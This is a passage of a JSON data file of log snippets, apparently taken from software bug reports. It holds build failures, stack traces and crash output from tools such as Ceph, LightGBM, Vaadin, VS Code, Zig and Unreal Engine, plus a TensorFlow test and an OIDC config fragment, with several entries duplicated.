        "logs": "No match for argument: libcephfs-devel-16.2.1-0.el8\r\nNo match for argument: librados-devel-16.2.1-0.el8\r\nNo match for argument: librbd-devel-16.2.1-0.el8\r\nError: Unable to find a match: libcephfs-devel-16.2.1-0.el8 librados-devel-16.2.1-0.el8 librbd-devel-16.2.1-0.el8\r\nThe command '/bin/sh -c true &&     yum clean all &&     cv=\"$(rpm -q --queryformat '%{version}-%{release}' ceph-common)\" &&     yum install -y         git wget curl make         /usr/bin/cc /usr/bin/c++         \"libcephfs-devel-${cv}\" \"librados-devel-${cv}\" \"librbd-devel-${cv}\" &&     true' returned a non-zero code: 1\r\nmake: *** [Makefile:73: .build.pacific] Error 1"
    },
    {
        "logs": "$python -c \"import quippy\"\r\nFortran runtime error: Incorrect extent in VALUE argument to DATE_AND_TIME intrinsic: is -2, should be >=8"
    },
    {
        "logs": "Fatal Python error: GC object already tracked\r\n\r\nCurrent thread 0x00007f2b048e8700 (most recent call first):\r\n  File \"/home/tsukasa_omoto/.pyenv/versions/3.5.2/lib/python3.5/json/__init__.py\", line 310 in loads\r\n  File \"/home/tsukasa_omoto/.pyenv/versions/3.5.2/lib/python3.5/site-packages/lightgbm-0.1-py3.5.egg/lightgbm/basic.py\", line 1607 in dump_model\r\n  File \"/home/tsukasa_omoto/.pyenv/versions/3.5.2/lib/python3.5/site-packages/lightgbm-0.1-py3.5.egg/lightgbm/basic.py\", line 1653 in feature_importance\r\n  File \"/home/tsukasa_omoto/.pyenv/versions/3.5.2/lib/python3.5/site-packages/lightgbm-0.1-py3.5.egg/lightgbm/sklearn.py\", line 481 in feature_importance\r\n  File \"test.py\", line 29 in <module>\r\n[1]    22034 abort (core dumped)  python test_classifier.py"
    },
    {
        "logs": "Fatal Python error: GC object already tracked\r\n\r\nCurrent thread 0x00007f2b048e8700 (most recent call first):\r\n  File \"/home/tsukasa_omoto/.pyenv/versions/3.5.2/lib/python3.5/json/__init__.py\", line 310 in loads\r\n  File \"/home/tsukasa_omoto/.pyenv/versions/3.5.2/lib/python3.5/site-packages/lightgbm-0.1-py3.5.egg/lightgbm/basic.py\", line 1607 in dump_model\r\n  File \"/home/tsukasa_omoto/.pyenv/versions/3.5.2/lib/python3.5/site-packages/lightgbm-0.1-py3.5.egg/lightgbm/basic.py\", line 1653 in feature_importance\r\n  File \"/home/tsukasa_omoto/.pyenv/versions/3.5.2/lib/python3.5/site-packages/lightgbm-0.1-py3.5.egg/lightgbm/sklearn.py\", line 481 in feature_importance\r\n  File \"test.py\", line 29 in <module>\r\n[1]    22034 abort (core dumped)  python test_classifier.py"
    },
    {
        "logs": "dart\r\n  var uri = new Uri(scheme: \"http\", host: \"\", port: 8080);\r\n  print(uri.toString()); // http://:8080\r\n  print(uri.origin); // Exception Bad state: Cannot use origin without a scheme: http://:8080"
    },
    {
        "logs": "dart\r\n  var uri = new Uri(scheme: \"http\", host: \"\", port: 8080);\r\n  print(uri.toString()); // http://:8080\r\n  print(uri.origin); // Exception Bad state: Cannot use origin without a scheme: http://:8080"
    },
    {
        "logs": "1/13/2017 12:54:21 PMtime=\"2017-01-13T11:54:21Z\" level=info msg=\"KUBERNETES_URL is not set, skipping init of kubernetes controller\"\r\n1/13/2017 12:54:21 PMtime=\"2017-01-13T11:54:21Z\" level=info msg=\"Starting Rancher LB service\"\r\n1/13/2017 12:54:21 PMtime=\"2017-01-13T11:54:21Z\" level=info msg=\"LB controller: rancher\"\r\n1/13/2017 12:54:21 PMtime=\"2017-01-13T11:54:21Z\" level=info msg=\"LB provider: haproxy\"\r\n1/13/2017 12:54:21 PMtime=\"2017-01-13T11:54:21Z\" level=info msg=\"starting rancher controller\"\r\n1/13/2017 12:54:21 PMtime=\"2017-01-13T11:54:21Z\" level=info msg=\"Healthcheck handler is listening on :10241\"\r\n1/13/2017 12:54:21 PMtime=\"2017-01-13T11:54:21Z\" level=error msg=\"Failed to get lb config: Error 404 accessing /self/service path\"\r\n1/13/2017 12:54:22 PMtime=\"2017-01-13T11:54:22Z\" level=info msg=\" -- starting haproxy\\n[ALERT] 012/115421 (35) : Starting frontend GLOBAL: cannot bind UNIX socket [/run/haproxy/admin.sock]\\n\"\r\n1/13/2017 12:54:23 PMtime=\"2017-01-13T11:54:23Z\" level=error msg=\"Failed to get lb config: Error 404 accessing /self/service path\"\r\n1/13/2017 12:54:23 PMtime=\"2017-01-13T11:54:23Z\" level=error msg=\"Failed to get lb config: Error 404 accessing /self/service path\"\r\n1/13/2017 12:54:24 PMtime=\"2017-01-13T11:54:24Z\" level=error msg=\"Failed to get lb config: Error 404 accessing /self/service path\"\r\n1/13/2017 12:54:26 PMtime=\"2017-01-13T11:54:26Z\" level=error msg=\"Failed to get lb config: Error 404 accessing /self/service path\"\r\n1/13/2017 12:54:26 PMtime=\"2017-01-13T11:54:26Z\" level=error msg=\"Failed to get lb config: Error 404 accessing /self/service path\"\r\n1/13/2017 12:54:27 PMtime=\"2017-01-13T11:54:27Z\" level=error msg=\"Failed to get lb config: Error 404 accessing /self/service path\"\r\n1/13/2017 12:54:28 PMtime=\"2017-01-13T11:54:28Z\" level=error msg=\"Failed to get lb config: Error 404 accessing /self/service path\"\r\n1/13/2017 12:54:30 PMtime=\"2017-01-13T11:54:30Z\" level=error msg=\"Failed to get lb config: Error 404 accessing /self/service path\"\r\n1/13/2017 12:54:31 PMtime=\"2017-01-13T11:54:31Z\" level=error msg=\"Failed to get lb config: Error 404 accessing /self/service path\""
    },
    {
        "logs": "Exception ValueError: ValueError(u'to_rgba: Invalid rgba arg \"(1.0, 0.5, 0.0, 1.0)\"\\nto_rgb: Invalid rgb arg \"(1.0, 0.5, 0.0, 1.0)\"\\ncould not convert string to float: (1.0, 0.5, 0.0, 1.0)',) in <module 'threading' from '/usr/lib/python2.7/threading.pyc'> ignored"
    },
    {
        "logs": "HTTP ERROR 500\r\nProblem accessing /ordermanager/main. Reason:\r\n\r\n    Server Error\r\nCaused by:\r\njavax.servlet.ServletException: com.vaadin.flow.server.ServiceException: java.lang.NullPointerException\r\n\tat com.vaadin.flow.server.VaadinServlet.service(VaadinServlet.java:248)\r\n\tat javax.servlet.http.HttpServlet.service(HttpServlet.java:790)\r\n\tat org.eclipse.jetty.servlet.ServletHolder.handle(ServletHolder.java:876)\r\n\tat org.eclipse.jetty.servlet.ServletHandler$CachedChain.doFilter(ServletHandler.java:1623)\r\n\tat org.eclipse.jetty.websocket.server.WebSocketUpgradeFilter.doFilter(WebSocketUpgradeFilter.java:214)\r\n\tat org.eclipse.jetty.servlet.ServletHandler$CachedChain.doFilter(ServletHandler.java:1610)\r\n\tat org.eclipse.jetty.servlet.ServletHandler.doHandle(ServletHandler.java:540)\r\n\tat org.eclipse.jetty.server.handler.ScopedHandler.handle(ScopedHandler.java:146)\r\n\tat org.eclipse.jetty.security.SecurityHandler.handle(SecurityHandler.java:548)\r\n\tat org.eclipse.jetty.server.handler.HandlerWrapper.handle(HandlerWrapper.java:132)\r\n\tat org.eclipse.jetty.server.handler.ScopedHandler.nextHandle(ScopedHandler.java:257)\r\n\tat org.eclipse.jetty.server.session.SessionHandler.doHandle(SessionHandler.java:1711)\r\n\tat org.eclipse.jetty.server.handler.ScopedHandler.nextHandle(ScopedHandler.java:255)\r\n\tat org.eclipse.jetty.server.handler.ContextHandler.doHandle(ContextHandler.java:1347)\r\n\tat org.eclipse.jetty.server.handler.ScopedHandler.nextScope(ScopedHandler.java:203)\r\n\tat org.eclipse.jetty.servlet.ServletHandler.doScope(ServletHandler.java:480)\r\n\tat org.eclipse.jetty.server.session.SessionHandler.doScope(SessionHandler.java:1678)\r\n\tat org.eclipse.jetty.server.handler.ScopedHandler.nextScope(ScopedHandler.java:201)\r\n\tat org.eclipse.jetty.server.handler.ContextHandler.doScope(ContextHandler.java:1249)\r\n\tat org.eclipse.jetty.server.handler.ScopedHandler.handle(ScopedHandler.java:144)\r\n\tat org.eclipse.jetty.server.handler.HandlerWrapper.handle(HandlerWrapper.java:132)\r\n\tat org.eclipse.jetty.server.Server.handle(Server.java:505)\r\n\tat org.eclipse.jetty.server.HttpChannel.handle(HttpChannel.java:370)\r\n\tat org.eclipse.jetty.server.HttpConnection.onFillable(HttpConnection.java:267)\r\n\tat org.eclipse.jetty.io.AbstractConnection$ReadCallback.succeeded(AbstractConnection.java:305)\r\n\tat org.eclipse.jetty.io.FillInterest.fillable(FillInterest.java:103)\r\n\tat org.eclipse.jetty.io.ChannelEndPoint$2.run(ChannelEndPoint.java:117)\r\n\tat org.eclipse.jetty.util.thread.strategy.EatWhatYouKill.runTask(EatWhatYouKill.java:333)\r\n\tat org.eclipse.jetty.util.thread.strategy.EatWhatYouKill.doProduce(EatWhatYouKill.java:310)\r\n\tat org.eclipse.jetty.util.thread.strategy.EatWhatYouKill.tryProduce(EatWhatYouKill.java:168)\r\n[Truncated]\n\tat java.lang.Thread.run(Thread.java:745)\r\nCaused by: com.vaadin.flow.server.ServiceException: java.lang.NullPointerException\r\n\tat com.vaadin.flow.server.VaadinService.handleExceptionDuringRequest(VaadinService.java:1589)\r\n\tat com.vaadin.flow.server.VaadinService.handleRequest(VaadinService.java:1552)\r\n\tat com.vaadin.flow.server.VaadinServlet.service(VaadinServlet.java:246)\r\n\t... 34 more\r\nCaused by: java.lang.NullPointerException\r\n\tat com.vaadin.flow.server.frontend.FrontendUtils.getStatsAssetsByChunkName(FrontendUtils.java:474)\r\n\tat com.vaadin.flow.server.BootstrapHandler$BootstrapPageBuilder.appendNpmBundle(BootstrapHandler.java:877)\r\n\tat com.vaadin.flow.server.BootstrapHandler$BootstrapPageBuilder.setupFrameworkLibraries(BootstrapHandler.java:859)\r\n\tat com.vaadin.flow.server.BootstrapHandler$BootstrapPageBuilder.setupDocumentHead(BootstrapHandler.java:742)\r\n\tat com.vaadin.flow.server.BootstrapHandler$BootstrapPageBuilder.getBootstrapPage(BootstrapHandler.java:517)\r\n\tat com.vaadin.flow.server.BootstrapHandler.synchronizedHandleRequest(BootstrapHandler.java:458)\r\n\tat com.vaadin.flow.server.SynchronizedRequestHandler.handleRequest(SynchronizedRequestHandler.java:40)\r\n\tat com.vaadin.flow.server.VaadinService.handleRequest(VaadinService.java:1540)\r\n\t... 35 more"
    },
    {
        "logs": "HTTP ERROR 500\r\nProblem accessing /ordermanager/main. Reason:\r\n\r\n    Server Error\r\nCaused by:\r\njavax.servlet.ServletException: com.vaadin.flow.server.ServiceException: java.lang.NullPointerException\r\n\tat com.vaadin.flow.server.VaadinServlet.service(VaadinServlet.java:248)\r\n\tat javax.servlet.http.HttpServlet.service(HttpServlet.java:790)\r\n\tat org.eclipse.jetty.servlet.ServletHolder.handle(ServletHolder.java:876)\r\n\tat org.eclipse.jetty.servlet.ServletHandler$CachedChain.doFilter(ServletHandler.java:1623)\r\n\tat org.eclipse.jetty.websocket.server.WebSocketUpgradeFilter.doFilter(WebSocketUpgradeFilter.java:214)\r\n\tat org.eclipse.jetty.servlet.ServletHandler$CachedChain.doFilter(ServletHandler.java:1610)\r\n\tat org.eclipse.jetty.servlet.ServletHandler.doHandle(ServletHandler.java:540)\r\n\tat org.eclipse.jetty.server.handler.ScopedHandler.handle(ScopedHandler.java:146)\r\n\tat org.eclipse.jetty.security.SecurityHandler.handle(SecurityHandler.java:548)\r\n\tat org.eclipse.jetty.server.handler.HandlerWrapper.handle(HandlerWrapper.java:132)\r\n\tat org.eclipse.jetty.server.handler.ScopedHandler.nextHandle(ScopedHandler.java:257)\r\n\tat org.eclipse.jetty.server.session.SessionHandler.doHandle(SessionHandler.java:1711)\r\n\tat org.eclipse.jetty.server.handler.ScopedHandler.nextHandle(ScopedHandler.java:255)\r\n\tat org.eclipse.jetty.server.handler.ContextHandler.doHandle(ContextHandler.java:1347)\r\n\tat org.eclipse.jetty.server.handler.ScopedHandler.nextScope(ScopedHandler.java:203)\r\n\tat org.eclipse.jetty.servlet.ServletHandler.doScope(ServletHandler.java:480)\r\n\tat org.eclipse.jetty.server.session.SessionHandler.doScope(SessionHandler.java:1678)\r\n\tat org.eclipse.jetty.server.handler.ScopedHandler.nextScope(ScopedHandler.java:201)\r\n\tat org.eclipse.jetty.server.handler.ContextHandler.doScope(ContextHandler.java:1249)\r\n\tat org.eclipse.jetty.server.handler.ScopedHandler.handle(ScopedHandler.java:144)\r\n\tat org.eclipse.jetty.server.handler.HandlerWrapper.handle(HandlerWrapper.java:132)\r\n\tat org.eclipse.jetty.server.Server.handle(Server.java:505)\r\n\tat org.eclipse.jetty.server.HttpChannel.handle(HttpChannel.java:370)\r\n\tat org.eclipse.jetty.server.HttpConnection.onFillable(HttpConnection.java:267)\r\n\tat org.eclipse.jetty.io.AbstractConnection$ReadCallback.succeeded(AbstractConnection.java:305)\r\n\tat org.eclipse.jetty.io.FillInterest.fillable(FillInterest.java:103)\r\n\tat org.eclipse.jetty.io.ChannelEndPoint$2.run(ChannelEndPoint.java:117)\r\n\tat org.eclipse.jetty.util.thread.strategy.EatWhatYouKill.runTask(EatWhatYouKill.java:333)\r\n\tat org.eclipse.jetty.util.thread.strategy.EatWhatYouKill.doProduce(EatWhatYouKill.java:310)\r\n\tat org.eclipse.jetty.util.thread.strategy.EatWhatYouKill.tryProduce(EatWhatYouKill.java:168)\r\n[Truncated]\n\tat java.lang.Thread.run(Thread.java:745)\r\nCaused by: com.vaadin.flow.server.ServiceException: java.lang.NullPointerException\r\n\tat com.vaadin.flow.server.VaadinService.handleExceptionDuringRequest(VaadinService.java:1589)\r\n\tat com.vaadin.flow.server.VaadinService.handleRequest(VaadinService.java:1552)\r\n\tat com.vaadin.flow.server.VaadinServlet.service(VaadinServlet.java:246)\r\n\t... 34 more\r\nCaused by: java.lang.NullPointerException\r\n\tat com.vaadin.flow.server.frontend.FrontendUtils.getStatsAssetsByChunkName(FrontendUtils.java:474)\r\n\tat com.vaadin.flow.server.BootstrapHandler$BootstrapPageBuilder.appendNpmBundle(BootstrapHandler.java:877)\r\n\tat com.vaadin.flow.server.BootstrapHandler$BootstrapPageBuilder.setupFrameworkLibraries(BootstrapHandler.java:859)\r\n\tat com.vaadin.flow.server.BootstrapHandler$BootstrapPageBuilder.setupDocumentHead(BootstrapHandler.java:742)\r\n\tat com.vaadin.flow.server.BootstrapHandler$BootstrapPageBuilder.getBootstrapPage(BootstrapHandler.java:517)\r\n\tat com.vaadin.flow.server.BootstrapHandler.synchronizedHandleRequest(BootstrapHandler.java:458)\r\n\tat com.vaadin.flow.server.SynchronizedRequestHandler.handleRequest(SynchronizedRequestHandler.java:40)\r\n\tat com.vaadin.flow.server.VaadinService.handleRequest(VaadinService.java:1540)\r\n\t... 35 more"
    },
    {
        "logs": "$ git log -1\r\ncommit abc51bc36a668bd672eb061033b84d070011d122\r\nAuthor: Greg McCullough <gmccullo@redhat.com>\r\nDate:   Wed Aug 21 12:01:25 2019 -0400\r\n\r\n    Merge pull request #334 from username_0/null_coalescing_1698184\r\n    \r\n    Fix the issue with null coalescing fields as input parameters.\r\n    \r\n    (cherry picked from commit 69b58ee4ce23eef1591a90c145e8b225821a80b9)\r\n    \r\n    https://bugzilla.redhat.com/show_bug.cgi?id=1698184"
    },
    {
        "logs": "$ git log -1\r\ncommit abc51bc36a668bd672eb061033b84d070011d122\r\nAuthor: Greg McCullough <gmccullo@redhat.com>\r\nDate:   Wed Aug 21 12:01:25 2019 -0400\r\n\r\n    Merge pull request #334 from username_0/null_coalescing_1698184\r\n    \r\n    Fix the issue with null coalescing fields as input parameters.\r\n    \r\n    (cherry picked from commit 69b58ee4ce23eef1591a90c145e8b225821a80b9)\r\n    \r\n    https://bugzilla.redhat.com/show_bug.cgi?id=1698184"
    },
    {
        "logs": "(node:8428) Warning: Accessing non-existent property 'Characteristic' of module exports inside circular dependency\r\n(Use "
    },
    {
        "logs": " to show where the warning was created)\r\n(node:8428) Warning: Accessing non-existent property 'Service' of module exports inside circular dependency"
    },
    {
        "logs": "(node:8428) Warning: Accessing non-existent property 'Characteristic' of module exports inside circular dependency\r\n(Use `node --trace-warnings ...` to show where the warning was created)\r\n(node:8428) Warning: Accessing non-existent property 'Service' of module exports inside circular dependency"
    },
    {
        "logs": "yarn run v1.22.5\r\nwarning package.json: No license field\r\nwarning vscode-test-sample@0.0.1: The engine \"vscode\" appears to be invalid.\r\n$ node ./out/sample/test/runTest.js\r\nDownloading VS Code 1.49.0 from https://update.code.visualstudio.com/1.49.0/linux-x64/stable\r\nDownloaded VS Code 1.49.0 into .vscode-test/vscode-1.49.0\r\nFound --crash-reporter-directory argument. Setting crashDumps directory to be '/home/runner/work/vscode-149-linux-crash/vscode-149-linux-crash/crash'\r\n\r\nWarning: 'sandbox' is not in the list of known options, but still passed to Electron/Chromium.\r\n\r\n[main 2020-09-13T06:14:31.876Z] update#setState idle\r\n\r\n(node:2967) Electron: Loading non-context-aware native module in renderer: '/home/runner/work/vscode-149-linux-crash/vscode-149-linux-crash/sample/.vscode-test/vscode-1.49.0/VSCode-linux-x64/resources/app/node_modules.asar.unpacked/vscode-sqlite3/build/Release/sqlite.node'. This is deprecated, see https://github.com/electron/electron/issues/18397.\r\n\r\n[2906:0913/061433.509722:FATAL:gpu_data_manager_impl_private.cc(439)] GPU process isn't usable. Goodbye.\r\n\r\n(node:2967) Electron: Loading non-context-aware native module in renderer: '/home/runner/work/vscode-149-linux-crash/vscode-149-linux-crash/sample/.vscode-test/vscode-1.49.0/VSCode-linux-x64/resources/app/node_modules.asar.unpacked/spdlog/build/Release/spdlog.node'. This is deprecated, see https://github.com/electron/electron/issues/18397.\r\n\r\nFailed to generate minidump.\r\nFailed to run tests\r\nExit code:   null\r\nSIGILL\r\nDone"
    },
    {
        "logs": "$ tsc -p test.tsconfig.json && node ./out/test/unitTests/runTest.js\r\nmkdir: cannot create directory \u2018/run/user/1001\u2019\r\n: Permission denied"
    },
    {
        "logs": "Problem:\r\n\r\n1. (de) Data Not Available\r\nThe data you were trying to access could not be found. It may be due to another user deleting the data or a system error. If you know the data is not deleted but cannot access it, please look at our <A href=\"{0}\" title=\"support{1}\">support</a> page.\r\n\r\n2. (fr) Data Not Available\r\nThe data you were trying to access could not be found. It may be due to another user deleting the data or a system error. If you know the data is not deleted but cannot access it, please look at our <A href=\"{0}\" title=\"support{1}\">support</a> page."
    },
    {
        "logs": "Problem:\r\n\r\n1. (de) Data Not Available\r\nThe data you were trying to access could not be found. It may be due to another user deleting the data or a system error. If you know the data is not deleted but cannot access it, please look at our <A href=\"{0}\" title=\"support{1}\">support</a> page.\r\n\r\n2. (fr) Data Not Available\r\nThe data you were trying to access could not be found. It may be due to another user deleting the data or a system error. If you know the data is not deleted but cannot access it, please look at our <A href=\"{0}\" title=\"support{1}\">support</a> page."
    },
    {
        "logs": "lld-link: error: libcmt.lib(chkstk.obj): machine type x64 conflicts with x86\r\nerror: LLDReportedFailure\r\nhacks...The following command exited with error code 1:\r\nE:\\zig\\tools\\compiler\\zig.exe build-exe E:\\zig\\projects\\hacks\\src\\main.zig E:\\zig\\projects\\hacks\\zig-cache\\o\\369fff57f898bef605621ddcfd3dcaa5\\clib32.lib -lc -OReleaseSafe --cache-dir E:\\zig\\projects\\hacks\\zig-cache --global-cache-dir C:\\Users\\admin\\AppData\\Local\\zig --name hacks -target i386-windows-msvc -mcpu pentium4 --enable-cache\r\nerror: the following build command failed with exit code 1:\r\nE:\\zig\\projects\\hacks\\zig-cache\\o\\8d8f04730fdce8d329f912f6adbef206\\build.exe E:\\zig\\tools\\compiler\\zig.exe E:\\zig\\projects\\hacks E:\\zig\\projects\\hacks\\zig-cache C:\\Users\\admin\\AppData\\Local\\zig"
    },
    {
        "logs": "error: AccessDenied\r\nhacks...The following command exited with error code 1:\r\nE:\\zig\\tools\\compiler\\zig.exe build-exe E:\\zig\\projects\\hacks\\src\\main.zig E:\\zig\\projects\\hacks\\zig-cache\\o\\369fff57f898bef605621ddcfd3dcaa5\\clib32.lib -lc -OReleaseSafe --cache-dir E:\\zig\\projects\\hacks\\zig-cache --global-cache-dir C:\\Users\\admin\\AppData\\Local\\zig --name hacks -target i386-windows-msvc -mcpu pentium4 --enable-cache\r\nerror: the following build command failed with exit code 1:\r\nE:\\zig\\projects\\hacks\\zig-cache\\o\\8d8f04730fdce8d329f912f6adbef206\\build.exe E:\\zig\\tools\\compiler\\zig.exe E:\\zig\\projects\\hacks E:\\zig\\projects\\hacks\\zig-cache C:\\Users\\admin\\AppData\\Local\\zig"
    },
    {
        "logs": "lld-link: error: libcmt.lib(chkstk.obj): machine type x64 conflicts with x86\r\nerror: LLDReportedFailure\r\nhacks...The following command exited with error code 1:\r\nE:\\zig\\tools\\compiler\\zig.exe build-exe E:\\zig\\projects\\hacks\\src\\main.zig E:\\zig\\projects\\hacks\\zig-cache\\o\\369fff57f898bef605621ddcfd3dcaa5\\clib32.lib -lc -OReleaseSafe --cache-dir E:\\zig\\projects\\hacks\\zig-cache --global-cache-dir C:\\Users\\admin\\AppData\\Local\\zig --name hacks -target i386-windows-msvc -mcpu pentium4 --enable-cache\r\nerror: the following build command failed with exit code 1:\r\nE:\\zig\\projects\\hacks\\zig-cache\\o\\8d8f04730fdce8d329f912f6adbef206\\build.exe E:\\zig\\tools\\compiler\\zig.exe E:\\zig\\projects\\hacks E:\\zig\\projects\\hacks\\zig-cache C:\\Users\\admin\\AppData\\Local\\zig"
    },
    {
        "logs": "There was an error while starting the test runner:\r\nError: No tests defined! using source folder: /tmp/tmp-19wODo22pfsHgW/features\r\n    at /home/node/node_modules/nightwatch/lib/runner/run.js:213:20\r\n    at /home/node/node_modules/nightwatch/lib/runner/walk.js:161:15\r\n    at /home/node/node_modules/nightwatch/lib/runner/walk.js:76:13\r\n    at FSReqWrap.oncomplete (fs.js:123:15)\r\n[09:58:09] 'task1' errored after 4.19 s\r\n[09:58:09] Error in plugin 'gulp-nightwatch'\r\nMessage:\r\n    nightwatch exited with code 1\r\nDetails:\r\n    domainEmitter: [object Object]\r\n    domain: [object Object]\r\n    domainThrown: false\r\n[09:58:09] 'default' errored after 4.2 s\r\n[09:58:09] The following tasks did not complete: task2\r\n[09:58:09] Did you forget to signal async completion?"
    },
    {
        "logs": "There was an error while starting the test runner:\r\nError: No tests defined! using source folder: /tmp/tmp-19wODo22pfsHgW/features\r\n    at /home/node/node_modules/nightwatch/lib/runner/run.js:213:20\r\n    at /home/node/node_modules/nightwatch/lib/runner/walk.js:161:15\r\n    at /home/node/node_modules/nightwatch/lib/runner/walk.js:76:13\r\n    at FSReqWrap.oncomplete (fs.js:123:15)\r\n[09:58:09] 'task1' errored after 4.19 s\r\n[09:58:09] Error in plugin 'gulp-nightwatch'\r\nMessage:\r\n    nightwatch exited with code 1\r\nDetails:\r\n    domainEmitter: [object Object]\r\n    domain: [object Object]\r\n    domainThrown: false\r\n[09:58:09] 'default' errored after 4.2 s\r\n[09:58:09] The following tasks did not complete: task2\r\n[09:58:09] Did you forget to signal async completion?"
    },
    {
        "logs": "import numpy as np\r\nimport os\r\nimport tensorflow as tf\r\nfrom tensorflow.python.platform import test\r\n\r\n\r\nclass AllreduceTest(test.TestCase):\r\n    def dumpFailure(self, my_rank, num_ranks, first_output, second_output):\r\n        out_dims = first_output.shape\r\n        assert(len(out_dims) == 2)\r\n        for i in range(out_dims[0]):\r\n            for j in range(out_dims[1]):\r\n                if first_output[i][j] != second_output[i][j]:\r\n                    print(\"{}: [{}][{}]: {} {}\"\r\n                          .format(my_rank, i, j, first_output[i][j],\r\n                                  second_output[i][j]),\r\n                          flush=True)\r\n\r\n    def test_mpi_allreduce(self):\r\n        num_gpus = len(os.environ['CUDA_VISIBLE_DEVICES'].split(','))\r\n        gpu_indices = [index for index in range(num_gpus)]\r\n\r\n        mat_dim = 3072\r\n\r\n        outputs = []\r\n        for index in gpu_indices:\r\n            with tf.device(\"/gpu:{}\".format(index)):\r\n                initer = tf.random_uniform_initializer(-0.1, 0.1, seed=1234,\r\n                                                       dtype=tf.float32)\r\n                outputs.append(tf.get_variable(\"outputs-{}\".format(index),\r\n                                               shape=(mat_dim, mat_dim),\r\n                                               dtype=tf.float32,\r\n                                               initializer=initer))\r\n\r\n        # Session to test initialization across multiple GPUs\r\n        gpu_options = tf.GPUOptions(\r\n            visible_device_list=','.join(str(idx) for idx in gpu_indices))\r\n        config = tf.ConfigProto(gpu_options=gpu_options)\r\n        with tf.Session(config=config) as sess:\r\n            sess.run(tf.global_variables_initializer())\r\n            output_result = sess.run(outputs)\r\n            for index in gpu_indices:\r\n                if not np.allclose(output_result[0], output_result[index]):\r\n                    print(\"CRAP: Init outputs 0 and {} do not match\"\r\n                          .format(index), flush=True)\r\n                    self.dumpFailure(index, num_gpus, output_result[0],\r\n                                     output_result[index])\r\n                    assert(np.allclose(output_result[0],\r\n                                       output_result[index]))\r\n\r\nif __name__ == '__main__':\r\n    test.main()"
    },
    {
        "logs": "import numpy as np\r\nimport os\r\nimport tensorflow as tf\r\nfrom tensorflow.python.platform import test\r\n\r\n\r\nclass AllreduceTest(test.TestCase):\r\n    def dumpFailure(self, my_rank, num_ranks, first_output, second_output):\r\n        out_dims = first_output.shape\r\n        assert(len(out_dims) == 2)\r\n        for i in range(out_dims[0]):\r\n            for j in range(out_dims[1]):\r\n                if first_output[i][j] != second_output[i][j]:\r\n                    print(\"{}: [{}][{}]: {} {}\"\r\n                          .format(my_rank, i, j, first_output[i][j],\r\n                                  second_output[i][j]),\r\n                          flush=True)\r\n\r\n    def test_mpi_allreduce(self):\r\n        num_gpus = len(os.environ['CUDA_VISIBLE_DEVICES'].split(','))\r\n        gpu_indices = [index for index in range(num_gpus)]\r\n\r\n        mat_dim = 3072\r\n\r\n        outputs = []\r\n        for index in gpu_indices:\r\n            with tf.device(\"/gpu:{}\".format(index)):\r\n                initer = tf.random_uniform_initializer(-0.1, 0.1, seed=1234,\r\n                                                       dtype=tf.float32)\r\n                outputs.append(tf.get_variable(\"outputs-{}\".format(index),\r\n                                               shape=(mat_dim, mat_dim),\r\n                                               dtype=tf.float32,\r\n                                               initializer=initer))\r\n\r\n        # Session to test initialization across multiple GPUs\r\n        gpu_options = tf.GPUOptions(\r\n            visible_device_list=','.join(str(idx) for idx in gpu_indices))\r\n        config = tf.ConfigProto(gpu_options=gpu_options)\r\n        with tf.Session(config=config) as sess:\r\n            sess.run(tf.global_variables_initializer())\r\n            output_result = sess.run(outputs)\r\n            for index in gpu_indices:\r\n                if not np.allclose(output_result[0], output_result[index]):\r\n                    print(\"CRAP: Init outputs 0 and {} do not match\"\r\n                          .format(index), flush=True)\r\n                    self.dumpFailure(index, num_gpus, output_result[0],\r\n                                     output_result[index])\r\n                    assert(np.allclose(output_result[0],\r\n                                       output_result[index]))\r\n\r\nif __name__ == '__main__':\r\n    test.main()"
    },
    {
        "logs": "Performing 2 actions (5 in parallel)\r\n[1/2] Link libUE4Editor-NdiMedia.so\r\n/usr/bin/ld: /home/username_0/Documents/Unreal Projects/MyProject/Plugins/NdiMedia/ThirdParty/lib/linux/x86_64-linux-gnu-5.4/libndi.a(Processing.NDI.Find.o): r\u00e9adressage de R_X86_64_32 en vertu de \u00ab\u00a0__gxx_personality_v0\u00a0\u00bb ne peut \u00eatre utilis\u00e9 lors de la cr\u00e9ation d'un objet partag\u00e9; recompilez avec -fPIC\r\n/home/username_0/Documents/Unreal Projects/MyProject/Plugins/NdiMedia/ThirdParty/lib/linux/x86_64-linux-gnu-5.4/libndi.a\u00a0: erreur lors de l'ajout de symboles\u00a0: Mauvaise valeur\r\nclang: error: linker command failed with exit code 1 (use -v to see invocation)\r\nERROR: UBT ERROR: Failed to produce item: /home/username_0/Documents/Unreal Projects/MyProject/Plugins/NdiMedia/Binaries/Linux/libUE4Editor-NdiMedia.so\r\nTotal build time: 34,06 seconds (Local executor: 0,00 seconds)\r\nLogInit:Warning: Still incompatible or missing module: libUE4Editor-NdiMedia.so\r\nLogInit:Warning: Still incompatible or missing module: libUE4Editor-NdiMediaEditor.so"
    },
    {
        "logs": "import { OpenIdConnectConfiguration } from \"aurelia-open-id-connect\";\r\nimport { UserManagerSettings, WebStorageStateStore } from \"oidc-client\";\r\n\r\nconst appHost = \"http://localhost:9000\";\r\n\r\nexport default {\r\n  loginRedirectRoute: \"/private\",\r\n  logoutRedirectRoute: \"/index\",\r\n  unauthorizedRedirectRoute: \"/index\",\r\n  userManagerSettings: {\r\n\r\n    // The number of seconds in advance of access token expiry\r\n    // to raise the access token expiring event.\r\n    accessTokenExpiringNotificationTime: 1,\r\n\r\n    // Either host your own OpenID Provider or select a certified authority\r\n    // from the list http://openid.net/certification/\r\n    authority: \"http://localhost/CustomerName/Identity/\",\r\n\r\n    automaticSilentRenew: true,\r\n\r\n    // IdentityServer4 supports OpenID Connect Session Management\r\n    // https://openid.net/specs/openid-connect-session-1_0.html\r\n    monitorSession: true,\r\n    checkSessionInterval: 2000,\r\n\r\n    // The client or application ID that the authority issues.\r\n    client_id: \"CustomerClient\",\r\n\r\n    filterProtocolClaims: true,\r\n    loadUserInfo: false,\r\n    post_logout_redirect_uri: "
    },
    {
        "logs": ",\r\n    response_type: \"id_token\",\r\n    scope: \"openid jcc-setup\",\r\n    // number of millisecods to wait for the authorization\r\n    // server to response to silent renew request\r\n    silentRequestTimeout: 10000,\r\n    silent_redirect_uri: "
    },
    {
